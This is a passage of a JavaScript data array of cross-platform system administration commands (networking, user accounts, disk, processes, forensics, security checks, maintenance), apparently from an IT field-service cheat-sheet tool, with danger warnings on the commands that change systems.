 desc:"Active routes and the default gateway per interface.",
 code:{
  ps:`Get-NetRoute -AddressFamily IPv4 |
  Sort-Object RouteMetric |
  Select-Object DestinationPrefix, NextHop, RouteMetric, ifIndex`,
  cmd:`route print -4`,
  mac:`netstat -rn -f inet`,
  linux:`ip route`
 }},
{id:"net-connections", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Active TCP connections + process",
 desc:"Established sessions and which process owns each.",
 code:{
  ps:`Get-NetTCPConnection -State Established |
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}`,
  cmd:`netstat -ano | findstr ESTABLISHED`,
  mac:`sudo lsof -nP -iTCP -sTCP:ESTABLISHED`,
  linux:`ss -tnp state established`
 }},
{id:"net-dns-records", level:"beginner", cat:"Network", title:"Query DNS record types (MX/TXT/…)",
 desc:"Look up mail, text, and alias records — mail/SPF/DKIM troubleshooting.",
 code:{
  ps:`foreach ($t in 'MX','TXT','NS','CNAME') {
  "== $t =="; Resolve-DnsName -Type $t example.com -ErrorAction SilentlyContinue
}`,
  cmd:`nslookup -type=MX example.com
nslookup -type=TXT example.com`,
  mac:`for t in MX TXT NS CNAME; do echo "== $t =="; dig +short example.com $t; done`,
  linux:`for t in MX TXT NS CNAME; do echo "== $t =="; dig +short example.com $t; done   # dig: dnsutils/bind-utils`
 }},
{id:"net-http-head", level:"beginner", cat:"Network", title:"HTTP status & response headers",
 desc:"Check a URL's status code, redirects, and server headers.",
 code:{
  ps:`$r = Invoke-WebRequest -Uri 'https://example.com' -Method Head
"Status: $([int]$r.StatusCode) $($r.StatusDescription)"
$r.Headers`,
  cmd:`curl -sI https://example.com`,
  mac:`curl -sI https://example.com`,
  linux:`curl -sI https://example.com`
 }},
{id:"net-tls-cert", level:"beginner", cat:"Network", title:"Inspect a server's TLS certificate",
 desc:"Subject, issuer, and validity dates for a host's cert. cmd/mac/linux use openssl.",
 code:{
  ps:`$h='example.com'; $p=443
$c=[System.Net.Sockets.TcpClient]::new($h,$p)
$s=[System.Net.Security.SslStream]::new($c.GetStream())
$s.AuthenticateAsClient($h)
[System.Security.Cryptography.X509Certificates.X509Certificate2]$s.RemoteCertificate |
  Select-Object Subject, Issuer, NotBefore, NotAfter, Thumbprint
$s.Dispose(); $c.Dispose()`,
  cmd:`openssl s_client -connect example.com:443 -servername example.com < NUL | openssl x509 -noout -subject -issuer -dates`,
  mac:`echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates`,
  linux:`echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates`
 }},
{id:"net-shares", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Network shares & sessions",
 desc:"Local file shares being served and what's connected / mounted.",
 code:{
  ps:`Get-SmbShare | Select-Object Name, Path, Description
"-- sessions --"; Get-SmbSession | Select-Object ClientComputerName, ClientUserName, NumOpens`,
  cmd:`net share
echo -- sessions --
net session`,
  mac:`sharing -l 2>/dev/null
echo "-- mounted --"; mount | grep -i smbfs`,
  linux:`sudo smbstatus 2>/dev/null       # Samba server
sudo exportfs -v 2>/dev/null      # NFS exports
echo "-- mounted --"; mount | grep -E 'cifs|nfs'`
 }},
{id:"net-mapdrive", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Map / mount a network share",
 desc:"Attach an SMB/CIFS share as a drive or mount point. Edit server/share/creds.",
 code:{
  ps:`New-SmbMapping -LocalPath 'Z:' -RemotePath '\\\\server\\share' -Persistent $true
# with creds: -UserName 'DOMAIN\\user' -Password 'pass'`,
  cmd:`net use Z: \\\\server\\share /persistent:yes
:: with creds: net use Z: \\\\server\\share password /user:DOMAIN\\user`,
  mac:`mkdir -p ~/mnt/share
mount_smbfs //user@server/share ~/mnt/share    # or: open smb://server/share`,
  linux:`sudo mkdir -p /mnt/share
sudo mount -t cifs //server/share /mnt/share -o username=USER   # needs cifs-utils`
 }},
{id:"net-proxy", level:"beginner", cat:"Network", title:"Show proxy configuration",
 desc:"Current system/user HTTP(S) proxy settings.",
 code:{
  ps:`Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' |
  Select-Object ProxyEnable, ProxyServer, AutoConfigURL
netsh winhttp show proxy`,
  cmd:`netsh winhttp show proxy
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer`,
  mac:`scutil --proxy`,
  linux:`env | grep -i _proxy
gsettings get org.gnome.system.proxy mode 2>/dev/null`
 }},
{id:"net-adapter-toggle", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Disable / re-enable a network adapter",
 desc:"Bounce a NIC to clear a stuck link. Edit the interface name.",
 danger:"Takes the interface down — you'll lose any remote session on it. Needs admin/root.",
 code:{
  ps:`Disable-NetAdapter -Name 'Ethernet' -Confirm:$false
Enable-NetAdapter  -Name 'Ethernet' -Confirm:$false`,
  cmd:`netsh interface set interface "Ethernet" admin=disable
netsh interface set interface "Ethernet" admin=enable`,
  mac:`sudo ifconfig en0 down && sudo ifconfig en0 up`,
  linux:`sudo ip link set eth0 down && sudo ip link set eth0 up`
 }},
{id:"net-stack-reset", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Reset / restart the network stack",
 desc:"Last-resort fix for corrupted networking. Windows resets Winsock + TCP/IP.",
 danger:"Windows needs a reboot to finish. All: drops connectivity; needs admin/root.",
 code:{
  ps:`netsh winsock reset
netsh int ip reset
Clear-DnsClientCache
Write-Host "Reboot to complete."`,
  cmd:`netsh winsock reset
netsh int ip reset
ipconfig /flushdns
echo Reboot to complete.`,
  mac:`sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
sudo ifconfig en0 down && sudo ifconfig en0 up`,
  linux:`sudo systemctl restart NetworkManager 2>/dev/null || sudo systemctl restart systemd-networkd`
 }},
{id:"net-wifi-scan", level:"beginner",requires:{"elevation":true}, cat:"Network", title:"Scan nearby Wi-Fi networks",
 desc:"List visible SSIDs, signal, and channel.",
 code:{
  ps:`netsh wlan show networks mode=bssid`,
  cmd:`netsh wlan show networks mode=bssid`,
  mac:`# airport was removed in macOS 14.4+; on older builds:
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null ||
  system_profiler SPAirPortDataType`,
  linux:`nmcli dev wifi list 2>/dev/null || sudo iw dev wlan0 scan | grep -E 'SSID|signal'`
 }},

/* ---------- USERS & ACCESS (added) ---------- */
{id:"usr-whoami", level:"beginner", cat:"Users & Access", title:"Current user, groups & privileges",
 desc:"Who am I, my group memberships, and (Windows) my privileges.",
 code:{
  ps:`whoami /all`,
  cmd:`whoami /all`,
  mac:`id
echo "groups: $(groups)"`,
  linux:`id
echo "groups: $(groups)"`
 }},
{id:"usr-passwd-reset", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Reset a user's password",
 desc:"Set a new password for an account. Edit the username.",
 danger:"Changes another user's credentials — authorized admin recovery only.",
 code:{
  ps:`$pw = Read-Host 'New password' -AsSecureString
Set-LocalUser -Name 'techuser' -Password $pw`,
  cmd:`net user techuser *`,
  mac:`sudo dscl . -passwd /Users/techuser`,
  linux:`sudo passwd techuser`
 }},
{id:"usr-disable", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Disable / enable an account",
 desc:"Lock an account out without deleting it (swap the verb to re-enable).",
 danger:"Blocks the user from logging in. Needs admin/root.",
 code:{
  ps:`Disable-LocalUser -Name 'techuser'
# re-enable: Enable-LocalUser -Name 'techuser'`,
  cmd:`net user techuser /active:no
:: re-enable: net user techuser /active:yes`,
  mac:`sudo pwpolicy -u techuser disableuser
# re-enable: sudo pwpolicy -u techuser enableuser`,
  linux:`sudo usermod -L techuser
# re-enable: sudo usermod -U techuser`
 }},
{id:"usr-unlock", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Unlock a locked-out account",
 desc:"Clear a lockout from too many failed logons.",
 danger:"Authorized admin recovery only. Needs admin/root.",
 code:{
  ps:`# Windows has no local 'unlock' cmdlet; a lockout clears after the lockout
# window, or immediately when you reset the password:
Set-LocalUser -Name 'techuser' -Password (Read-Host 'New password' -AsSecureString)`,
  cmd:`:: no native local unlock; reset the password to clear the lockout:
net user techuser *`,
  mac:`# force-clear by resetting the password:
sudo dscl . -passwd /Users/techuser`,
  linux:`sudo faillock --user techuser --reset   # pam_faillock
sudo usermod -U techuser                # also clears a password lock`
 }},
{id:"usr-delete", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Delete a local account",
 desc:"Remove a user. mac/linux options also delete the home directory.",
 danger:"Irreversible account (and home-folder) deletion. Needs admin/root.",
 code:{
  ps:`Remove-LocalUser -Name 'techuser'`,
  cmd:`net user techuser /delete`,
  mac:`sudo sysadminctl -deleteUser techuser`,
  linux:`sudo userdel -r techuser   # -r also removes the home directory`
 }},
{id:"usr-groups-of", level:"beginner", cat:"Users & Access", title:"Groups a user belongs to",
 desc:"Enumerate the group memberships of a specific account. Edit the username.",
 code:{
  ps:`Get-LocalGroup | Where-Object {
  Get-LocalGroupMember $_.Name -Member 'techuser' -ErrorAction SilentlyContinue
} | Select-Object -ExpandProperty Name`,
  cmd:`net user techuser | findstr /C:"Local Group Memberships" /C:"Global Group"`,
  mac:`id techuser
groups techuser`,
  linux:`id techuser
groups techuser`
 }},
{id:"usr-lastlogon", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Last logon & password age",
 desc:"When accounts last signed in and when passwords were last changed.",
 code:{
  ps:`Get-LocalUser |
  Select-Object Name, Enabled, LastLogon, PasswordLastSet, PasswordExpires`,
  cmd:`net user techuser | findstr /C:"Last logon" /C:"Password last set" /C:"Password expires"`,
  mac:`last | head -20
# password last set:
sudo dscl . -read /Users/techuser accountPolicyData 2>/dev/null`,
  linux:`lastlog
echo "-- password aging --"; sudo chage -l techuser`
 }},
{id:"usr-policy", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Password & lockout policy",
 desc:"Minimum length, expiry, and lockout thresholds in effect.",
 code:{
  ps:`net accounts`,
  cmd:`net accounts`,
  mac:`sudo pwpolicy getaccountpolicies 2>/dev/null | tail -n +2`,
  linux:`grep -E '^PASS_(MAX|MIN|WARN)' /etc/login.defs
echo "-- lockout (pam_faillock) --"; grep -h faillock /etc/pam.d/* 2>/dev/null | sort -u`
 }},
{id:"usr-logoff", level:"beginner",requires:{"elevation":true}, cat:"Users & Access", title:"Force-logoff a session",
 desc:"Disconnect / sign out another user's session. Get the session id first.",
 danger:"Ends the session immediately — unsaved work is lost. Needs admin/root.",
 code:{
  ps:`query user
# then log off by ID:
logoff 2`,
  cmd:`query user
logoff 2`,
  mac:`# terminate a user's GUI + processes:
sudo launchctl bootout user/$(id -u techuser) 2>/dev/null || sudo pkill -KILL -u techuser`,
  linux:`loginctl terminate-user techuser   # or: sudo pkill -KILL -u techuser`
 }},
{id:"usr-lock", level:"beginner", cat:"Users & Access", title:"Lock the screen now",
 desc:"Immediately lock the current session.",
 code:{
  ps:`rundll32.exe user32.dll,LockWorkStation`,
  cmd:`rundll32.exe user32.dll,LockWorkStation`,
  mac:`/System/Library/CoreServices/"Menu Extras"/User.menu/Contents/Resources/CGSession -suspend`,
  linux:`loginctl lock-session 2>/dev/null || xdg-screensaver lock`
 }},

/* ---------- DISK & FILES (added) ---------- */
{id:"disk-tree", level:"beginner", cat:"Disk & Files", title:"Folder size breakdown",
 desc:"Total size of each immediate subfolder — find what's eating a directory.",
 code:{
  ps:`Get-ChildItem -Directory | ForEach-Object {
  $mb=[math]::Round(((Get-ChildItem $_.FullName -Recurse -File -ErrorAction SilentlyContinue |
    Measure-Object Length -Sum).Sum)/1MB,1)
  [pscustomobject]@{Folder=$_.Name; MB=$mb}
} | Sort-Object MB -Descending`,
  mac:`du -h -d1 . | sort -h`,
  linux:`du -h --max-depth=1 . | sort -h`,
  py:`import os
for d in sorted(os.scandir("."), key=lambda e: e.name):
    if d.is_dir():
        tot=sum(os.path.getsize(os.path.join(r,f))
                for r,_,fs in os.walk(d.path) for f in fs
                if os.path.exists(os.path.join(r,f)))
        print(f"{tot/1048576:10.1f} MB  {d.name}")`
 }},
{id:"disk-smart", level:"beginner",requires:{"elevation":true}, cat:"Disk & Files", title:"Drive SMART / health status",
 desc:"Physical disk health — early warning of a failing drive.",
 code:{
  ps:`Get-PhysicalDisk |
  Select-Object FriendlyName, MediaType, HealthStatus, OperationalStatus,
    @{n='Size_GB';e={[math]::Round($_.Size/1GB)}}`,
  cmd:`wmic diskdrive get model,status
:: wmic is deprecated; PowerShell Get-PhysicalDisk is preferred`,
  mac:`diskutil info disk0 | grep -i "SMART"`,
  linux:`sudo smartctl -H /dev/sda   # needs smartmontools`
 }},
{id:"file-search-text", level:"beginner", cat:"Disk & Files", title:"Search text inside files",
 desc:"Recursively find files containing a string, with line numbers.",
 code:{
  ps:`Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue |
  Select-String -Pattern 'searchterm' |
  Select-Object Path, LineNumber, Line`,
  cmd:`findstr /s /i /n "searchterm" *.*`,
  mac:`grep -rniI "searchterm" .`,
  linux:`grep -rniI "searchterm" .`,
  py:`import pathlib
term="searchterm"
for p in pathlib.Path(".").rglob("*"):
    if p.is_file():
        try:
            for i,line in enumerate(p.open('r',errors='ignore'),1):
                if term in line: print(f"{p}:{i}: {line.rstrip()}")
        except OSError: pass`
 }},
{id:"file-zip", level:"beginner", cat:"Disk & Files", title:"Create / extract a zip archive",
 desc:"Zip a folder and unzip an archive. Edit the paths.",
 code:{
  ps:`Compress-Archive -Path .\\folder\\* -DestinationPath out.zip -Force
# extract:
Expand-Archive -Path out.zip -DestinationPath .\\dest -Force`,
  cmd:`tar -a -c -f out.zip folder
:: extract:
tar -x -f out.zip`,
  mac:`zip -r out.zip folder
unzip out.zip -d dest`,
  linux:`zip -r out.zip folder      # or: tar -czf out.tar.gz folder
unzip out.zip -d dest       # or: tar -xzf out.tar.gz`,
  py:`import shutil
shutil.make_archive("out","zip","folder")   # -> out.zip
shutil.unpack_archive("out.zip","dest")`
 }},
{id:"file-copy", level:"beginner", cat:"Disk & Files", title:"Mirror / sync a folder",
 desc:"Efficiently copy a tree, only changed files. Edit src/dst.",
 danger:"/MIR and --delete make the destination match the source — extra files there are DELETED.",
 code:{
  ps:`robocopy .\\src .\\dst /MIR /R:1 /W:1
# drop /MIR for an additive copy (no deletes)`,
  cmd:`robocopy src dst /MIR /R:1 /W:1`,
  mac:`rsync -a --delete src/ dst/     # trailing slash on src matters`,
  linux:`rsync -a --delete src/ dst/     # drop --delete for an additive copy`
 }},
{id:"file-perms", level:"beginner",requires:{"elevation":true}, cat:"Disk & Files", title:"View / change file permissions",
 desc:"Inspect ACLs/mode and grant access. Edit the target and principal.",
 danger:"Changing ownership or ACLs can lock users out of files. Others' files need elevation.",
 code:{
  ps:`Get-Acl .\\file | Format-List
# grant a user full control:
icacls .\\file /grant 'DOMAIN\\user:(F)'`,
  cmd:`icacls file
:: grant modify:
icacls file /grant user:(M)`,
  mac:`ls -le file
chmod 640 file
sudo chown user:staff file`,
  linux:`stat -c '%A %U:%G' file
chmod 640 file
sudo chown user:group file`
 }},

/* ---------- PROCESSES & SERVICES (added) ---------- */
{id:"proc-tree", level:"beginner", cat:"Processes & Services", title:"Process tree (parent → child)",
 desc:"See process parentage — spot what spawned a suspicious child.",
 code:{
  ps:`Get-CimInstance Win32_Process |
  Select-Object ProcessId, ParentProcessId, Name |
  Sort-Object ParentProcessId, ProcessId`,
  cmd:`wmic process get Name,ProcessId,ParentProcessId
:: wmic deprecated; PowerShell Get-CimInstance Win32_Process is preferred`,
  mac:`ps -axo pid,ppid,user,command`,
  linux:`ps -e --forest -o pid,ppid,user,cmd    # or: pstree -p`
 }},
{id:"proc-find-port", level:"beginner",requires:{"elevation":true}, cat:"Processes & Services", title:"Find the process using a port",
 desc:"Identify what's bound to a port — resolve 'address already in use'. Edit the port.",
 code:{
  ps:`Get-NetTCPConnection -LocalPort 443 |
  Select-Object LocalPort, State, OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}`,
  cmd:`netstat -ano | findstr :443
:: map the PID from the last column:
tasklist /fi "PID eq 1234"`,
  mac:`sudo lsof -nP -iTCP:443`,
  linux:`sudo ss -tulpnH "sport = :443" || sudo lsof -nP -i:443`
 }},
{id:"svc-config", level:"beginner",requires:{"elevation":true}, cat:"Processes & Services", title:"Set a service's start type",
 desc:"Enable, disable, or set a service to manual start. Edit the service name.",
 danger:"Disabling the wrong service can break the system. Needs admin/root.",
 code:{
  ps:`Set-Service -Name 'Spooler' -StartupType Automatic
# options: Automatic | Manual | Disabled`,
  cmd:`sc config Spooler start= auto
:: note the space after '=' ; options: auto | demand | disabled`,
  mac:`sudo launchctl enable system/org.cups.cupsd
# disable: sudo launchctl disable system/org.cups.cupsd`,
  linux:`sudo systemctl enable --now cups
# disable: sudo systemctl disable --now cups`
 }},
{id:"svc-failed", level:"beginner", cat:"Processes & Services", title:"Failed / not-running auto services",
 desc:"Services set to auto-start that aren't running — post-boot triage.",
 code:{
  ps:`Get-Service | Where-Object { $_.StartType -eq 'Automatic' -and $_.Status -ne 'Running' } |
  Select-Object Name, DisplayName, Status`,
  mac:`# nonzero last-exit-status = a job that failed:
launchctl list | awk 'NR==1 || ($1!="-" && $2+0!=0)'`,
  linux:`systemctl --failed --no-pager`
 }},
{id:"sched-tasks", level:"beginner", cat:"Processes & Services", title:"Scheduled tasks / cron jobs",
 desc:"Enumerate scheduled automation — a common persistence spot.",
 code:{
  ps:`Get-ScheduledTask | Where-Object State -ne 'Disabled' |
  Select-Object TaskPath, TaskName, State`,
  cmd:`schtasks /query /fo table /v`,
  mac:`crontab -l 2>/dev/null
launchctl list
ls ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null`,
  linux:`crontab -l 2>/dev/null
ls -la /etc/cron.d /etc/cron.daily 2>/dev/null
systemctl list-timers --all --no-pager`
 }},

/* ---------- FORENSICS (added) ---------- */
{id:"for-failed-logons", level:"intermediate",requires:{"elevation":true}, cat:"Forensics", title:"Failed logon attempts (Event 4625)",
 desc:"Recent failed sign-ins — brute-force / lockout investigation.",
 danger:"Requires administrator / root to read the security/auth logs.",
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 25 |
  Select-Object TimeCreated,
    @{n='User';e={$_.Properties[5].Value}},
    @{n='Source';e={$_.Properties[19].Value}}`,
  cmd:`wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:25 /rd:true /f:text`,
  mac:`log show --style syslog --last 1d --predicate 'eventMessage CONTAINS[c] "authentication failed"' 2>/dev/null | tail -20`,
  linux:`sudo lastb 2>/dev/null | head -20
sudo grep -Ei 'failed password|authentication failure' /var/log/auth.log /var/log/secure 2>/dev/null | tail -20`
 }},
{id:"for-dns-cache", level:"intermediate",requires:{"elevation":true}, cat:"Forensics", title:"Cached DNS resolver entries",
 desc:"Names the host resolved recently. Fully exposed only on Windows.",
 code:{
  ps:`Get-DnsClientCache | Select-Object Entry, Type, Data, TimeToLive`,
  cmd:`ipconfig /displaydns`,
  mac:`# not directly listable; dump mDNSResponder state to the unified log:
sudo killall -INFO mDNSResponder
log show --last 2m --predicate 'process == "mDNSResponder"' 2>/dev/null | grep -i cache | tail`,
  linux:`# systemd-resolved keeps no dumpable list; show stats:
resolvectl statistics 2>/dev/null || echo "no dumpable cache"`
 }},
{id:"for-history", level:"intermediate", cat:"Forensics", title:"Shell command history",
 desc:"Recent commands run in the shell — user-activity triage.",
 code:{
  ps:`Get-Content (Get-PSReadLineOption).HistorySavePath -Tail 50`,
  cmd:`doskey /history`,
  mac:`tail -50 ~/.zsh_history 2>/dev/null; tail -50 ~/.bash_history 2>/dev/null`,
  linux:`tail -50 ~/.bash_history 2>/dev/null; tail -50 ~/.zsh_history 2>/dev/null`
 }},
{id:"for-evtx-export", level:"intermediate",requires:{"elevation":true}, cat:"Forensics", title:"Export a log for offline analysis",
 desc:"Save a copy of a system log to a file. Edit output paths.",
 danger:"Reading full logs needs admin/root; writes a (potentially large) export file.",
 code:{
  ps:`wevtutil epl System "$env:USERPROFILE\\Desktop\\System.evtx"
# or CSV: Get-WinEvent -LogName System -MaxEvents 500 | Export-Csv System.csv -NoTypeInformation`,
  cmd:`wevtutil epl System "%USERPROFILE%\\Desktop\\System.evtx"`,
  mac:`log collect --last 1d --output ~/Desktop/system.logarchive`,
  linux:`sudo journalctl --since "1 day ago" > ~/journal-$(date +%F).txt`
 }},

/* ---------- SECURITY (added) ---------- */
{id:"sec-defender-scan", level:"intermediate", cat:"Security", title:"Run a Microsoft Defender scan",
 desc:"Kick off an on-demand antivirus scan (Windows).",
 danger:"Full scans are long and CPU/disk heavy.",
 code:{
  ps:`Start-MpScan -ScanType QuickScan
# full: Start-MpScan -ScanType FullScan`,
  cmd:`"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 1`
 }},
{id:"sec-defender-update", level:"intermediate", cat:"Security", title:"Update Defender definitions",
 desc:"Pull the latest antivirus signatures (Windows).",
 code:{
  ps:`Update-MpSignature`,
  cmd:`"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe" -SignatureUpdate`
 }},
{id:"sec-defender-threats", level:"intermediate", cat:"Security", title:"Defender threat history",
 desc:"Malware Defender has detected on this machine (Windows).",
 code:{
  ps:`Get-MpThreat | Select-Object ThreatName, SeverityID, @{n='Detected';e={$_.InitialDetectionTime}}
Get-MpThreatDetection | Select-Object -First 20 ThreatID, ActionSuccess, ProcessName, InitialDetectionTime`
 }},
{id:"sec-encryption", level:"intermediate", cat:"Security", title:"Disk encryption status",
 desc:"Is the disk encrypted — BitLocker / FileVault / LUKS.",
 code:{
  ps:`Get-BitLockerVolume |
  Select-Object MountPoint, VolumeStatus, ProtectionStatus, EncryptionPercentage`,
  cmd:`manage-bde -status`,
  mac:`fdesetup status`,
  linux:`lsblk -o NAME,TYPE,FSTYPE,MOUNTPOINT | grep -i crypt
# details: sudo cryptsetup status <mapper-name>`
 }},
{id:"sec-firewall-rules", level:"intermediate",requires:{"elevation":true}, cat:"Security", title:"List firewall rules",
 desc:"Enumerate configured firewall rules.",
 code:{
  ps:`Get-NetFirewallRule -Enabled True |
  Select-Object DisplayName, Direction, Action, Profile |
  Sort-Object Direction, DisplayName`,
  cmd:`netsh advfirewall firewall show rule name=all`,
  mac:`sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps
sudo pfctl -sr 2>/dev/null`,
  linux:`sudo ufw status numbered 2>/dev/null || sudo iptables -S || sudo nft list ruleset`
 }},
{id:"sec-firewall-addrule", level:"intermediate",requires:{"elevation":true}, cat:"Security", title:"Add a firewall rule",
 desc:"Allow inbound traffic on a port. Edit port/name.",
 danger:"Opens an inbound hole in the firewall. Needs admin/root.",
 code:{
  ps:`New-NetFirewallRule -DisplayName 'Allow TCP 8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow`,
  cmd:`netsh advfirewall firewall add rule name="Allow TCP 8080" dir=in action=allow protocol=TCP localport=8080`,
  mac:`# app-based firewall; allow a binary to accept connections:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /path/to/app
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /path/to/app`,
  linux:`sudo ufw allow 8080/tcp   # or: sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT`
 }},
{id:"sec-rdp-status", level:"intermediate",requires:{"elevation":true}, cat:"Security", title:"Remote access (RDP/SSH) status",
 desc:"Whether remote desktop / remote login is enabled and who may connect.",
 code:{
  ps:`$deny=(Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server').fDenyTSConnections
"RDP enabled: $([bool](1-$deny))"
Get-LocalGroupMember 'Remote Desktop Users' -ErrorAction SilentlyContinue | Select-Object Name`,
  cmd:`reg query "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
net localgroup "Remote Desktop Users"`,
  mac:`sudo systemsetup -getremotelogin
launchctl list com.apple.screensharing >/dev/null 2>&1 && echo "Screen Sharing: on"`,
  linux:`systemctl is-active sshd ssh 2>/dev/null
systemctl is-active xrdp 2>/dev/null`
 }},
{id:"sec-uac", level:"intermediate", cat:"Security", title:"UAC configuration",
 desc:"User Account Control state and elevation prompt behavior (Windows).",
 code:{
  ps:`Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' |
  Select-Object EnableLUA, ConsentPromptBehaviorAdmin, PromptOnSecureDesktop`,
  cmd:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin`
 }},
{id:"sec-secureboot", level:"intermediate", cat:"Security", title:"Secure Boot & TPM status",
 desc:"Firmware secure-boot state and TPM/secure-enclave presence. Confirm-SecureBootUEFI needs admin.",
 code:{
  ps:`try { "SecureBoot: " + (Confirm-SecureBootUEFI) } catch { "SecureBoot: legacy BIOS or N/A" }
Get-Tpm | Select-Object TpmPresent, TpmReady, TpmEnabled`,
  cmd:`tpmtool getdeviceinformation`,
  mac:`csrutil status
system_profiler SPiBridgeDataType 2>/dev/null`,
  linux:`mokutil --sb-state 2>/dev/null
ls /sys/class/tpm/ 2>/dev/null && echo "TPM present"`
 }},
{id:"sec-audit-policy", level:"intermediate",requires:{"elevation":true}, cat:"Security", title:"Audit / logging policy",
 desc:"What security events are being audited.",
 code:{
  ps:`auditpol /get /category:*`,
  cmd:`auditpol /get /category:*`,
  mac:`sudo cat /etc/security/audit_control 2>/dev/null
sudo launchctl list com.apple.auditd >/dev/null 2>&1 && echo "auditd: on"`,
  linux:`sudo auditctl -l 2>/dev/null || echo "auditd not installed/active"
systemctl is-active auditd 2>/dev/null`
 }},

/* ---------- MAINTENANCE (added) ---------- */
{id:"mnt-reboot", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Reboot / shutdown (scheduled)",
 desc:"Restart or power off, optionally after a delay.",
 danger:"Ends all sessions and reboots/powers off the machine.",
 code:{
  ps:`shutdown /r /t 60          # reboot in 60s ; /s = shutdown ; /a = abort
# immediate: Restart-Computer -Force`,
  cmd:`shutdown /r /t 60
:: abort a pending shutdown: shutdown /a`,
  mac:`sudo shutdown -r +1        # reboot in 1 min ; -h to halt
# cancel: sudo killall shutdown`,
  linux:`sudo shutdown -r +1 "rebooting"   # -h to power off
# cancel: sudo shutdown -c`
 }},
{id:"mnt-chkdsk", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Check / repair a disk",
 desc:"Scan a filesystem for errors. Online scan is safe; repair needs the volume offline.",
 danger:"Repair (/f, repairVolume, fsck without -n) alters the filesystem and may need a reboot/unmount.",
 code:{
  ps:`Repair-Volume -DriveLetter C -Scan
# offline repair (schedules for reboot): Repair-Volume -DriveLetter C -OfflineScanAndFix`,
  cmd:`chkdsk C: /scan
:: full repair (reboot): chkdsk C: /f /r`,
  mac:`diskutil verifyVolume /
# repair the boot volume from Recovery: diskutil repairVolume /`,
  linux:`sudo fsck -n /dev/sda1        # -n = read-only check
# repair an UNMOUNTED fs: sudo fsck -y /dev/sda1`
 }},
{id:"mnt-diskcleanup", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Reclaim disk space",
 desc:"Clear caches, old updates, and logs to free space.",
 danger:"Permanently deletes cached files, old package data, and rotated logs.",
 code:{
  ps:`cleanmgr /sagerun:1
Dism /Online /Cleanup-Image /StartComponentCleanup`,
  cmd:`cleanmgr
Dism /Online /Cleanup-Image /StartComponentCleanup`,
  mac:`# thin local Time Machine snapshots + run system maintenance:
tmutil listlocalsnapshots / 2>/dev/null
sudo periodic daily weekly monthly`,
  linux:`sudo journalctl --vacuum-time=7d
sudo apt-get clean && sudo apt-get autoremove   # Debian/Ubuntu (dnf: sudo dnf clean all)`
 }},
{id:"mnt-update-check", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Check / install updates",
 desc:"List available updates, then optionally install them.",
 danger:"Installing updates changes software and may force a reboot. Needs admin/root.",
 code:{
  ps:`winget upgrade
# install everything: winget upgrade --all
# (OS/quality updates: Settings > Windows Update, or the PSWindowsUpdate module)`,
  cmd:`winget upgrade
:: install all: winget upgrade --all`,
  mac:`softwareupdate -l
# install all: sudo softwareupdate -ia --restart`,
  linux:`sudo apt update && apt list --upgradable
# install: sudo apt upgrade -y        (dnf: sudo dnf upgrade)`
 }},
{id:"mnt-restore-point", level:"beginner",requires:{"elevation":true}, cat:"Maintenance", title:"Create a system restore point",
 desc:"Snapshot system state before risky changes (Windows; System Restore must be enabled).",
 danger:"Requires an elevated prompt; no-op if System Protection is disabled for the drive.",
 code:{
  ps:`Checkpoint-Computer -Description 'Field service' -RestorePointType MODIFY_SETTINGS`,
  cmd:`wmic.exe /Namespace:\\\\root\\default Path SystemRestore Call CreateRestorePoint "Field service", 100, 7`
 }},
{id:"mnt-gpupdate", level:"beginner", cat:"Maintenance", title:"Force Group Policy refresh",
 desc:"Re-apply machine & user Group Policy immediately (Windows domain).",
 code:{
  ps:`gpupdate /force
# see applied policy: gpresult /r`,
  cmd:`gpupdate /force
:: report: gpresult /r`
 }},
{id:"mnt-print-queue", level:"beginner", cat:"Maintenance", title:"Clear a stuck print queue",
 desc:"Purge jammed print jobs and bounce the spooler.",
